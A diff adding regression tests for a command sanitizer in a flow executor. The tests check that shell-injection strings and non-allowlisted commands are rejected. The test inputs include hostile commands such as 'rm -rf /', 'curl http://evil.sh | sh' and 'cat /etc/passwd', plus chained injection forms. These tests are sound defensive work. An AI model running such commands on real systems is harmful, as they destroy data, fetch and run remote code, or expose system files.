@@ -1,5 +1,5 @@
 import { describe, test, expect } from 'bun:test'
-import { executeFlow, shouldContinueOnError, type FlowDefinition } from '../executor.js'
+import { executeFlow, executeCommand, shouldContinueOnError, sanitizeCommand, type FlowDefinition } from '../executor.js'
 
 /**
  * Regression tests for flow executor (issue #774).
@@ -135,5 +135,63 @@ describe('missing bridge configuration (issue #808)', () => {
     expect(state.failedSteps).toContain('a')
     expect(state.failedSteps).toContain('b')
     expect(state.failedSteps.length).toBe(2)
+  })
+})
+
+describe('executeCommand sanitization (issue #841)', () => {
+  test('sanitizeCommand parses a simple command into argv', () => {
+    const parsed = sanitizeCommand('npm install express jsonwebtoken bcrypt')
+    expect(parsed).toEqual(['npm', 'install', 'express', 'jsonwebtoken', 'bcrypt'])
+  })
+
+  test('sanitizeCommand rejects shell metacharacters that enable injection', () => {
+    expect(() => sanitizeCommand('npm install; rm -rf /')).toThrow()
+    expect(() => sanitizeCommand('npm install && rm -rf /')).toThrow()
+    expect(() => sanitizeCommand('npm install `rm -rf /`')).toThrow()
+    expect(() => sanitizeCommand('npm install $(rm -rf /)')).toThrow()
+    expect(() => sanitizeCommand('npm install | rm -rf /')).toThrow()
+    expect(() => sanitizeCommand('npm install > /etc/passwd')).toThrow()
+    expect(() => sanitizeCommand('npm install && curl http://evil.sh | sh')).toThrow()
+  })
+
+  test('sanitizeCommand rejects commands not on the allowlist', () => {
+    expect(() => sanitizeCommand('rm -rf /')).toThrow()
+    expect(() => sanitizeCommand('curl http://evil.sh | sh')).toThrow()
+    expect(() => sanitizeCommand('cat /etc/passwd')).toThrow()
+  })
+
+  test('sanitizeCommand allows allowlisted commands (npm, mkdir, touch)', () => {
+    expect(sanitizeCommand('npm install express')).toEqual(['npm', 'install', 'express'])
+    expect(sanitizeCommand('mkdir -p src/foo')).toEqual(['mkdir', '-p', 'src/foo'])
+    expect(sanitizeCommand('touch file.txt')).toEqual(['touch', 'file.txt'])
+  })
+
+  test('executeCommand passes parsed argv array to bridge.runCommand', async () => {
+    const received: any[] = []
+    const bridge = {
+      runCommand: async (cmd: any) => {
+        received.push(cmd)
+      },
+      editFile: async () => {},
+    }
+    await executeCommand('npm install express jsonwebtoken bcrypt', { bridge })
+    expect(received).toHaveLength(1)
+    // bridge should receive a structured argv array, not a raw shell string
+    expect(Array.isArray(received[0])).toBe(true)
+    expect(received[0]).toEqual(['npm', 'install', 'express', 'jsonwebtoken', 'bcrypt'])
+  })
+
+  test('executeCommand throws on injection attempt and never reaches the bridge', async () => {
+    let called = false
+    const bridge = {
+      runCommand: async () => {
+        called = true
+      },
+      editFile: async () => {},
+    }
+    await expect(
+      executeCommand('npm install express; rm -rf /', { bridge }),
+    ).rejects.toThrow()
+    expect(called).toBe(false)
   })
 })
